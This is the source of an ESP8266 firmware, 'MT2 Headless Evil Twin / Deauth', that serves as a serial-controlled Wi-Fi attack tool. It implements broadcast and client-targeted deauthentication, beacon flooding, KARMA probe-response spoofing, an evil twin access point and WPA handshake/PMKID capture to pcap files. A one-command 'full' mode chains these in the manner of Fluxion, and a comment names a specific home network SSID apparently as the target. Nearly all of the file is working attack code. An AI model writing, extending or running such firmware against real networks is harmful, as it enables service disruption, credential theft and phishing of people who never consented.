// MT2 — Headless Evil Twin / Deauth firmware (v2.0)
// No display. No buttons. Serial CLI @ 115200.

#include <ESP8266WiFi.h>
#include <SPI.h>
#include <LittleFS.h>
#include "config.h"
#include "attacks.h"
#include "wifi_utils.h"
#include "cli.h"
#include "evil_twin.h"
#include "advanced.h"

Network scanList[MAX_TARGETS];
int     scanCount = 0;
int     currentSelection = 0;
bool    twinRunning = false;
uint8_t twinChan = 0;
char    twinSsid[33] = {0};
bool    beaconFloodRunning = false;
uint8_t  bestAttackMode = 0;  // 0=off, 1=combo, 2=beacon, 3=karma
bool    karmaActive = false;
uint8_t karmaChan = 0;
char    karmaSsid[33] = "";
bool    comboAttackActive = false;
uint8_t comboState = 0;
unsigned long comboStateStart = 0;
bool    targetedDeauthActive = false;
uint8_t targetClientMac[6] = {0};
unsigned long lastTargetedDeauth = 0;

void setup() {
  cliInit();
  initDeauthFrame();
  initEvilTwin();

  // Storage init - try SD first, fallback to LittleFS
  if (!SD.begin(SD_CS)) {
    Serial.println(F("SD: FAIL (using LittleFS)"));
    if (!LittleFS.begin()) {
      Serial.println(F("LFS: FAIL (no storage!)"));
    } else {
      Serial.println(F("LFS: OK"));
    }
  } else {
    Serial.println(F("SD: OK"));
  }

  cliPrompt();
}

void cmdScan() {
  Serial.println(F("OK: Scanning..."));
  Serial.flush();
  performScan();
  Serial.print(F("OK: Found "));
  Serial.print(scanCount);
  Serial.println(F(" networks"));
  Serial.flush();
  cmdList();
}

void cmdList() {
  if (scanCount == 0) {
    Serial.println(F("ERR: no networks - run 'scan' first"));
    return;
  }
  for (int i = 0; i < scanCount; i++) {
    Serial.print(i);
    Serial.print(F(": "));
    Serial.print(scanList[i].ssid);
    Serial.print(F("  "));
    Serial.print(macStr(scanList[i].bssid));
    Serial.print(F("  ch="));
    Serial.print(scanList[i].channel);
    Serial.print(F("  rssi="));
    Serial.print(scanList[i].rssi);
    Serial.print(F("  "));
    Serial.println(scanList[i].encrypted ? F("ENC") : F("OPEN"));
  }
  Serial.flush();
}

void cmdTarget() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - target <idx>"));
    return;
  }
  int idx = atoi(cliCmd.argv[0]);
  if (idx < 0 || idx >= scanCount) {
    Serial.print(F("ERR: bad idx "));
    Serial.print(idx);
    Serial.print(F(" (have "));
    Serial.print(scanCount);
    Serial.println(F(" networks)"));
    return;
  }
  lockTargetByIdx(idx);
  patchBssid(targetMac);  // FIX: update deauth frame with correct BSSID
  Serial.print(F("OK: Locked "));
  Serial.print(idx);
  Serial.print(F(" "));
  Serial.print(scanList[idx].ssid);
  Serial.print(F(" "));
  Serial.print(macStr(targetMac));
  Serial.print(F(" ch="));
  Serial.println(targetChan);
  Serial.flush();
}

void cmdDeauth() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target - run 'target <idx>' first"));
    return;
  }
  if (capRunning) {
    // Promiscuous mode disables wifi_send_pkt_freedom - stop capture first
    Serial.println(F("WARN: capture running - stopping it first"));
    stopHandshakeCapture();
  }
  attackRunning = true;
  attackCount = 0;
  Serial.print(F("OK: Deauth ON "));
  Serial.print(macStr(targetMac));
  Serial.print(F(" ch="));
  Serial.print(targetChan);
  Serial.print(F(" mode=broadcast"));
  Serial.println();
  Serial.flush();
}

void cmdStop() {
  bool wasAttacking = attackRunning || (bestAttackMode != 0) || beaconFloodRunning || comboAttackActive;
  bestAttackMode = 0;
  beaconFloodRunning = false;
  comboAttackActive = false;
  comboState = 0;
  karmaActive = false;
  attackRunning = false;
  stopHandshakeCapture();
  stopEvilTwin();
  if (wasAttacking) {
    Serial.print(F("OK: All attacks OFF. frames="));
    Serial.println(attackCount);
  } else {
    Serial.println(F("OK: nothing running"));
  }
  Serial.flush();
}

void cmdStatus() {
  Serial.print(F("STATUS: mode="));
  if (bestAttackMode == 1) Serial.print(F("combo"));
  else if (beaconFloodRunning) Serial.print(F("beacon"));
  else if (attackRunning) Serial.print(F("deauth"));
  else if (targetedDeauthActive) Serial.print(F("tdeauth"));
  else Serial.print(F("off"));
  Serial.print(F(" frames="));
  Serial.print(attackCount);
  Serial.print(F(" target="));
  Serial.print(macStr(targetMac));
  Serial.print(F(" ch="));
  Serial.print(targetChan);
  Serial.print(F(" capture="));
  Serial.print(capRunning ? F("ON pkts=") : F("off"));
  if (capRunning) Serial.print(pcapCount);
  Serial.print(F(" eapol="));
  Serial.print(eapolCount);
  Serial.print(F(" pmkid="));
  Serial.print(pmkidCaptured ? F("YES") : F("no"));
  Serial.print(F(" clients="));
  Serial.print(knownClientCount);
  Serial.print(F(" twin="));
  Serial.println(twinRunning ? F("ON") : F("off"));
  Serial.flush();
}

void cmdCap() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - cap <file>"));
    return;
  }
  if (attackRunning) {
    Serial.println(F("WARN: attack running - stopping it first"));
    attackRunning = false;
  }
  // Concatenate args to support filename with spaces
  char filename[32] = "";
  for (int i = 0; i < cliCmd.argc && strlen(filename) < 28; i++) {
    if (i > 0) strncat(filename, "_", 28 - strlen(filename));
    strncat(filename, cliCmd.argv[i], 28 - strlen(filename));
  }
  char path[40];
  snprintf(path, sizeof(path), "/%s.pcap", filename);
  startHandshakeCapture(path);
  if (capRunning) {
    Serial.print(F("OK: Capturing to "));
    Serial.println(path);
  } else {
    Serial.println(F("ERR: capture failed (SD card?)"));
  }
  Serial.flush();
}

void cmdTwin() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - twin <ssid>"));
    return;
  }
  // Concatenate all args to support SSID with spaces
  char ssid[33] = "";
  for (int i = 0; i < cliCmd.argc && strlen(ssid) < 32; i++) {
    if (i > 0) strncat(ssid, " ", 32 - strlen(ssid));
    strncat(ssid, cliCmd.argv[i], 32 - strlen(ssid));
  }
  startEvilTwin(ssid);
  if (twinRunning) {
    Serial.print(F("OK: Evil twin ON "));
    Serial.print(ssid);
    Serial.print(F(" ch="));
    Serial.print(twinChan);
    Serial.print(F(" ip=192.168.4.1"));
    Serial.println();
  } else {
    Serial.println(F("ERR: twin failed"));
  }
  Serial.flush();
}

void cmdReboot() {
  Serial.println(F("OK: Rebooting..."));
  delay(100);
  ESP.restart();
}

// =====================================================
// BEST ATTACK MODE: combo (deauth + beacon flood + probe resp)
// =====================================================
void cmdCombo() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target - run 'target <idx>' first"));
    return;
  }
  // Initialize beacon + probe resp with target info
  Network* target = NULL;
  for (int i = 0; i < scanCount; i++) {
    if (memcmp(scanList[i].bssid, targetMac, 6) == 0) {
      target = &scanList[i];
      break;
    }
  }
  if (target != NULL) {
    patchBssid(targetMac);  // FIX: update deauth frame with correct BSSID
    initBeaconFrame(targetMac, target->ssid, targetChan);
    initProbeResp(targetMac, target->ssid, targetChan);
    Serial.print(F("OK: combo attack on "));
    Serial.print(target->ssid);
    Serial.print(F(" ch="));
    Serial.println(targetChan);
  } else {
    initBeaconFrame(targetMac, "TARGET", targetChan);
    initProbeResp(targetMac, "TARGET", targetChan);
    Serial.println(F("OK: combo attack started"));
  }
  bestAttackMode = 1;  // combo mode
  attackRunning = true;
  attackCount = 0;
}

void cmdBeacon() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target - run 'target <idx>' first"));
    return;
  }
  Network* target = NULL;
  for (int i = 0; i < scanCount; i++) {
    if (memcmp(scanList[i].bssid, targetMac, 6) == 0) {
      target = &scanList[i];
      break;
    }
  }
  if (target != NULL) {
    patchBssid(targetMac);  // FIX: update deauth frame with correct BSSID
    initBeaconFrame(targetMac, target->ssid, targetChan);
    initProbeResp(targetMac, target->ssid, targetChan);
  }
  beaconFloodRunning = !beaconFloodRunning;
  bestAttackMode = beaconFloodRunning ? 2 : 0;
  Serial.print(F("OK: beacon flood "));
  Serial.println(beaconFloodRunning ? F("ON") : F("OFF"));
}

// Debug: dump current deauth frame in hex
void cmdFrame() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target locked"));
    return;
  }
  Serial.println(F("FRAME: current deauth template"));
  Serial.print(F("  FC=0x"));
  Serial.print(deauthPkt[1], HEX);
  Serial.print(deauthPkt[0], HEX);
  Serial.print(F(" DA="));
  for (int i = 4; i < 10; i++) {
    if (deauthPkt[i] < 16) Serial.print(F("0"));
    Serial.print(deauthPkt[i], HEX);
    if (i < 9) Serial.print(F(":"));
  }
  Serial.print(F(" BSSID="));
  for (int i = 16; i < 22; i++) {
    if (deauthPkt[i] < 16) Serial.print(F("0"));
    Serial.print(deauthPkt[i], HEX);
    if (i < 21) Serial.print(F(":"));
  }
  Serial.print(F(" seq="));
  Serial.print(deauthPkt[22], HEX);
  Serial.print(deauthPkt[23], HEX);
  Serial.print(F(" reason=0x"));
  Serial.print(deauthPkt[25], HEX);
  Serial.print(deauthPkt[24], HEX);
  Serial.println();
  Serial.print(F("Bytes: "));
  for (int i = 0; i < 26; i++) {
    if (deauthPkt[i] < 16) Serial.print(F("0"));
    Serial.print(deauthPkt[i], HEX);
    Serial.print(F(" "));
  }
  Serial.println();
  Serial.flush();
}

// File management - lists pcap files on storage
void cmdLs() {
  bool useSD = SD.begin(SD_CS);
  if (useSD) {
    Serial.println(F("OK: files on SD:"));
    File root = SD.open("/");
    if (!root || !root.isDirectory()) {
      Serial.println(F("  (none)"));
    } else {
      File f = root.openNextFile();
      int count = 0;
      while (f) {
        if (!f.isDirectory()) {
          Serial.print(F("  "));
          Serial.print(f.size());
          Serial.print(F(" "));
          Serial.println(f.name());
          count++;
        }
        f = root.openNextFile();
      }
      if (count == 0) Serial.println(F("  (none)"));
    }
  } else {
    Serial.println(F("OK: files on LFS:"));
    Dir root = LittleFS.openDir("/");
    int count = 0;
    while (root.next()) {
      File f = root.openFile("r");
      Serial.print(F("  "));
      Serial.print(f.size());
      Serial.print(F(" "));
      Serial.println(root.fileName());
      f.close();
      count++;
    }
    if (count == 0) Serial.println(F("  (none)"));
  }
  Serial.flush();
}

// Stream file to serial (for APK download)
void cmdGet() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - get <filename>"));
    return;
  }
  // Build path
  char path[40];
  if (cliCmd.argv[0][0] == '/') {
    snprintf(path, sizeof(path), "%s", cliCmd.argv[0]);
  } else {
    snprintf(path, sizeof(path), "/%s", cliCmd.argv[0]);
  }
  // Try SD, then LFS
  File f;
  bool useSD = SD.begin(SD_CS);
  if (useSD) {
    f = SD.open(path, FILE_READ);
  } else {
    f = LittleFS.open(path, "r");
  }
  if (!f) {
    Serial.println(F("ERR: file not found"));
    return;
  }
  // Send file as hex chunks (binary-safe over serial)
  Serial.print(F("OK:FILE "));
  Serial.print(f.name());
  Serial.print(F(" size="));
  Serial.print(f.size());
  Serial.println();
  Serial.flush();
  // Send 64-byte chunks
  const size_t CHUNK = 64;
  uint8_t buf[CHUNK];
  size_t total = 0;
  while (f.available()) {
    size_t n = f.readBytes((char*)buf, CHUNK);
    if (n == 0) break;
    Serial.print(F("DATA:"));
    for (size_t i = 0; i < n; i++) {
      if (buf[i] < 16) Serial.print(F("0"));
      Serial.print(buf[i], HEX);
    }
    Serial.println();
    Serial.flush();
    total += n;
  }
  f.close();
  Serial.print(F("OK:END size="));
  Serial.println(total);
  Serial.flush();
}

// Delete file
void cmdRm() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - rm <filename>"));
    return;
  }
  char path[40];
  if (cliCmd.argv[0][0] == '/') {
    snprintf(path, sizeof(path), "%s", cliCmd.argv[0]);
  } else {
    snprintf(path, sizeof(path), "/%s", cliCmd.argv[0]);
  }
  bool useSD = SD.begin(SD_CS);
  bool ok;
  if (useSD) {
    ok = SD.remove(path);
  } else {
    ok = LittleFS.remove(path);
  }
  if (ok) {
    Serial.print(F("OK: removed "));
    Serial.println(path);
  } else {
    Serial.println(F("ERR: remove failed"));
  }
  Serial.flush();
}

// KARMA attack - respond to ALL probe requests
// Modern clients send probes for saved networks. We respond with our
// fake AP, making them auto-connect to us (no deauth needed).
// (globals defined at top of file)

void cmdKarma() {
  if (cliCmd.argc < 1) {
    Serial.println(F("ERR: usage - karma <ssid>"));
    return;
  }
  // Concatenate args
  char ssid[33] = "";
  for (int i = 0; i < cliCmd.argc && strlen(ssid) < 32; i++) {
    if (i > 0) strncat(ssid, " ", 32 - strlen(ssid));
    strncat(ssid, cliCmd.argv[i], 32 - strlen(ssid));
  }
  // Stop evil twin if running
  stopEvilTwin();
  // Start AP with same channel as target if known
  uint8_t chan = (targetChan > 0 && targetChan <= 13) ? targetChan : 6;
  // First start evil twin as AP
  if (!startEvilTwin(ssid, chan)) {
    Serial.println(F("ERR: karma AP failed"));
    return;
  }
  // Initialize probe REQUEST (we ASK for the network)
  initProbeRequest(ssid, chan);
  // Initialize probe RESPONSE (we REPLY for clients)
  initProbeResponse(ssid, chan);
  // Also init beacon flood (passive advertising)
  Network* target = NULL;
  for (int i = 0; i < scanCount; i++) {
    if (memcmp(scanList[i].bssid, targetMac, 6) == 0) {
      target = &scanList[i];
      break;
    }
  }
  if (target != NULL) {
    initBeaconFrame(targetMac, ssid, chan);
  } else {
    initBeaconFrame(targetMac, ssid, chan);  // Use target BSSID anyway
  }
  // Note: We don't enable promiscuous mode here - it conflicts with AP mode
  // The active broadcast (probe req + resp + beacon) in loop() is enough
  karmaActive = true;
  strncpy(karmaSsid, ssid, sizeof(karmaSsid));
  karmaChan = chan;
  Serial.print(F("OK: KARMA ON "));
  Serial.print(ssid);
  Serial.print(F(" ch="));
  Serial.print(chan);
  Serial.println(F(" (active broadcast - no client needed)"));
  Serial.flush();
}

// Targeted deauth to specific client (more effective than broadcast)
// (globals defined at top of file)

void cmdTDeauth() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target AP - run 'target <idx>' first"));
    return;
  }
  if (knownClientCount == 0) {
    Serial.println(F("ERR: no known clients - enable capture or wait for probes"));
    return;
  }
  patchBssid(targetMac);  // FIX: update deauth frame BSSID
  // Use first known client as target
  memcpy(targetClientMac, knownClients[0], 6);
  targetedDeauthActive = true;
  attackCount = 0;
  Serial.print(F("OK: Targeted deauth to client "));
  for (int i = 0; i < 6; i++) {
    if (targetClientMac[i] < 16) Serial.print(F("0"));
    Serial.print(targetClientMac[i], HEX);
    if (i < 5) Serial.print(F(":"));
  }
  Serial.print(F(" via AP "));
  for (int i = 0; i < 6; i++) {
    if (targetMac[i] < 16) Serial.print(F("0"));
    Serial.print(targetMac[i], HEX);
    if (i < 5) Serial.print(F(":"));
  }
  Serial.println();
  Serial.flush();
}

// Send targeted deauth to a specific client MAC
inline void sendTargetedDeauth() {
  // CRITICAL: Ensure STATIONAP_MODE for wifi_send_pkt_freedom
  wifi_set_opmode(STATIONAP_MODE);
  
  // Patch destination = client MAC
  memcpy(deauthPkt + 4, targetClientMac, 6);
  uint16_t reason = reasonCodes[reasonIdx];
  deauthPkt[24] = reason & 0xFF;
  deauthPkt[25] = (reason >> 8) & 0xFF;
  wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
  // Restore broadcast
  for (int i = 0; i < 6; i++) deauthPkt[4 + i] = 0xFF;
}

// ONE-BUTTON FULL ATTACK: deauth + evil twin + capture
// Step 1 (0-8s):    broadcast deauth
// Step 2 (8s-):     start evil twin with BSSID spoof
// Step 3 (8s-):     start promisc handshake capture
// This matches Fluxion's automated workflow.
void cmdFull() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    Serial.println(F("ERR: no target - run 'target <idx>' first"));
    return;
  }
  // Find SSID
  Network* target = NULL;
  for (int i = 0; i < scanCount; i++) {
    if (memcmp(scanList[i].bssid, targetMac, 6) == 0) {
      target = &scanList[i];
      break;
    }
  }
  if (target == NULL) {
    Serial.println(F("ERR: target not in scan list - re-scan"));
    return;
  }
  // Start FULL attack state machine
  comboAttackActive = true;
  comboState = 1;  // start with deauth
  comboStateStart = millis();
  // Begin deauth
  attackRunning = true;
  attackCount = 0;
  Serial.println(F("OK: FULL ATTACK STARTED"));
  Serial.print(F("  Target: "));
  Serial.println(target->ssid);
  Serial.println(F("  Phase 1/3: Deauth (8s)"));
  Serial.println(F("  Phase 2/3: Evil twin + capture"));
  Serial.println(F("  Phase 3/3: Auto-reconnect waiting"));
  Serial.flush();
}

// Probe request frame (used to detect clients actively searching for networks)
extern uint8_t probeReqPkt[];  // defined in advanced.h
static bool probeRequestReady = false;
static uint8_t probeReqChan = 0;
static char probeReqSsid[33] = "";

void initProbeRequest(const char* ssid, uint8_t chan) {
  memset(probeReqPkt, 0, 64);
  probeReqPkt[0] = 0x40;  // Mgmt / Probe Request
  probeReqPkt[1] = 0x00;
  for (int i = 0; i < 6; i++) probeReqPkt[4 + i] = 0xFF;  // broadcast DA
  for (int i = 0; i < 6; i++) probeReqPkt[10 + i] = 0xFF; // random SA
  for (int i = 0; i < 6; i++) probeReqPkt[16 + i] = 0xFF; // BSSID
  // SSID IE - ask for specific network
  probeReqPkt[24] = 0x00;
  uint8_t sslen = strlen(ssid);
  if (sslen > 32) sslen = 32;
  probeReqPkt[25] = sslen;
  memcpy(probeReqPkt + 26, ssid, sslen);
  probeRequestReady = true;
  probeReqChan = chan;
  strncpy(probeReqSsid, ssid, sizeof(probeReqSsid) - 1);
  probeReqSsid[sizeof(probeReqSsid) - 1] = '\0';
}

inline void sendProbeRequest() {
  if (probeRequestReady) {
    // Ensure STATIONAP_MODE for wifi_send_pkt_freedom
    wifi_set_opmode(STATIONAP_MODE);
    wifi_send_pkt_freedom(probeReqPkt, 50, 0);
  }
}

// PROBE RESPONSE - sent when we hear a client's probe request
// This is the HEART of Karma attack
extern uint8_t probeRespPkt[];  // defined in advanced.h
static char probeRespSsid[33] = "";
static uint8_t probeRespChan = 0;
static bool probeRespReady = false;

void initProbeResponse(const char* ssid, uint8_t chan) {
  memset(probeRespPkt, 0, sizeof(probeRespPkt));
  probeRespPkt[0] = 0x50;  // Mgmt / Probe Response
  probeRespPkt[1] = 0x00;
  // DA = broadcast
  for (int i = 0; i < 6; i++) probeRespPkt[4 + i] = 0xFF;
  // SA, BSSID = target AP
  if (targetMac[0] != 0) {
    memcpy(probeRespPkt + 10, targetMac, 6);
    memcpy(probeRespPkt + 16, targetMac, 6);
  } else {
    for (int i = 0; i < 6; i++) probeRespPkt[10 + i] = 0xFF;
    for (int i = 0; i < 6; i++) probeRespPkt[16 + i] = 0xFF;
  }
  // Timestamp
  probeRespPkt[24] = 0xff; probeRespPkt[25] = 0xff;
  probeRespPkt[26] = 0xff; probeRespPkt[27] = 0xff;
  probeRespPkt[28] = 0x00; probeRespPkt[29] = 0x00;
  probeRespPkt[30] = 0x00; probeRespPkt[31] = 0x00;
  // Beacon interval
  probeRespPkt[32] = 0x64; probeRespPkt[33] = 0x00;
  // Capability
  probeRespPkt[34] = 0x01; probeRespPkt[35] = 0x00;
  // SSID IE
  probeRespPkt[36] = 0x00;
  uint8_t sslen = strlen(ssid);
  if (sslen > 32) sslen = 32;
  probeRespPkt[37] = sslen;
  memcpy(probeRespPkt + 38, ssid, sslen);
  // Channel
  uint8_t pos = 38 + sslen;
  probeRespPkt[pos++] = 0x03;
  probeRespPkt[pos++] = 0x01;
  probeRespPkt[pos++] = chan;
  probeRespReady = true;
  probeRespChan = chan;
  strncpy(probeRespSsid, ssid, sizeof(probeRespSsid) - 1);
  probeRespSsid[sizeof(probeRespSsid) - 1] = '\0';
}

inline void sendProbeResponse() {
  if (probeRespReady) {
    // Ensure STATIONAP_MODE for wifi_send_pkt_freedom
    wifi_set_opmode(STATIONAP_MODE);
    wifi_send_pkt_freedom(probeRespPkt, 50, 0);
  }
}

inline const char* getProbeRespSsid() { return probeRespSsid; }
inline uint8_t getProbeRespChan() { return probeRespChan; }
inline bool isProbeRespReady() { return probeRespReady; }

void executeCli() {
  const char* v = cliCmd.verb;
  if      (!strcmp(v, "help"))   cliHelp();
  else if (!strcmp(v, "scan"))   cmdScan();
  else if (!strcmp(v, "list"))   cmdList();
  else if (!strcmp(v, "target")) cmdTarget();
  else if (!strcmp(v, "deauth")) cmdDeauth();
  else if (!strcmp(v, "stop"))   cmdStop();
  else if (!strcmp(v, "status")) cmdStatus();
  else if (!strcmp(v, "cap"))    cmdCap();
  else if (!strcmp(v, "twin"))   cmdTwin();
  else if (!strcmp(v, "combo"))  cmdCombo();
  else if (!strcmp(v, "beacon")) cmdBeacon();
  else if (!strcmp(v, "frame"))  cmdFrame();
  else if (!strcmp(v, "ls"))     cmdLs();
  else if (!strcmp(v, "get"))    cmdGet();
  else if (!strcmp(v, "rm"))     cmdRm();
  else if (!strcmp(v, "karma"))  cmdKarma();
  else if (!strcmp(v, "full"))   cmdFull();
  else if (!strcmp(v, "tdeauth")) cmdTDeauth();
  else if (!strcmp(v, "reboot")) cmdReboot();
  else {
    Serial.print(F("unknown: "));
    Serial.println(v);
  }
  cliPrompt();
}

void loop() {
  // FULL attack state machine
  if (comboAttackActive) {
    unsigned long elapsed = millis() - comboStateStart;
    if (comboState == 1 && elapsed > 8000) {
      // Phase 2: stop deauth, start evil twin + capture
      Network* target = NULL;
      for (int i = 0; i < scanCount; i++) {
        if (memcmp(scanList[i].bssid, targetMac, 6) == 0) {
          target = &scanList[i];
          break;
        }
      }
      if (target != NULL) {
        Serial.println(F("[full] Phase 2: starting evil twin + capture"));
        // Build filename
        char fname[40] = "/";
        strncat(fname, target->ssid, 20);
        for (int i = 1; i < (int)strlen(fname); i++) {
          if (fname[i] == ' ') fname[i] = '_';
        }
        strcat(fname, ".pcap");
        startHandshakeCapture(fname);
        startEvilTwin(target->ssid);
      }
      comboState = 2;
    }
    // Phase 1: deauth (handled below in attackRunning)
  }

  // Attack runner - combo mode (deauth + beacon + probe resp)
  if (bestAttackMode == 1) {
    // COMBO: deauth burst + beacon flood alternating
    for (int i = 0; i < 16; i++) {
      sendDeauthFrame();
      sendDisassocFrame();
      reasonIdx = (reasonIdx + 2) % REASON_COUNT;
      attackCount += 2;
    }
    for (int i = 0; i < 4; i++) sendBeaconFrame();
    for (int i = 0; i < 4; i++) sendProbeResp();
    yield();
    delay(15);

    // Heartbeat every 5s
    static uint32_t lastBeat = 0;
    if (millis() - lastBeat > 5000) {
      lastBeat = millis();
      Serial.print(F("HEARTBEAT: combo frames="));
      Serial.print(attackCount);
      Serial.print(F(" target="));
      Serial.print(macStr(targetMac));
      Serial.print(F(" ch="));
      Serial.println(targetChan);
    }
  } else if (attackRunning) {
    // Standard deauth
    executeAttack();
    static uint32_t lastBeat = 0;
    if (millis() - lastBeat > 5000) {
      lastBeat = millis();
      Serial.print(F("HEARTBEAT: frames="));
      Serial.print(attackCount);
      Serial.print(F(" target="));
      Serial.print(macStr(targetMac));
      Serial.print(F(" ch="));
      Serial.println(targetChan);
    }
  } else if (beaconFloodRunning) {
    // Beacon flood only
    for (int i = 0; i < 8; i++) sendBeaconFrame();
    yield();
    delay(20);
  } else if (targetedDeauthActive) {
    // Targeted deauth to specific client (more effective)
    for (int i = 0; i < 16; i++) {
      sendTargetedDeauth();
      reasonIdx = (reasonIdx + 1) % REASON_COUNT;
      attackCount++;
    }
    yield();
    delay(BURST_PAUSE_MS);
  } else if (karmaActive) {
    // KARMA: actively broadcast probe REQUEST + RESPONSE + BEACON
    // This makes our fake AP visible to all clients in range
    for (int i = 0; i < 4; i++) {
      sendProbeRequest();    // Ask "anyone got MAHFUZ HOME?"
      sendProbeResponse();   // Reply "yes I'm here!"
      sendBeaconFrame();     // Announce "I'm MAHFUZ HOME"
    }
    yield();
    delay(50);
  }

  // Evil twin loop (DNS + HTTP)
  evilTwinLoop();

  // CLI input
  if (cliPoll()) {
    executeCli();
  }
}
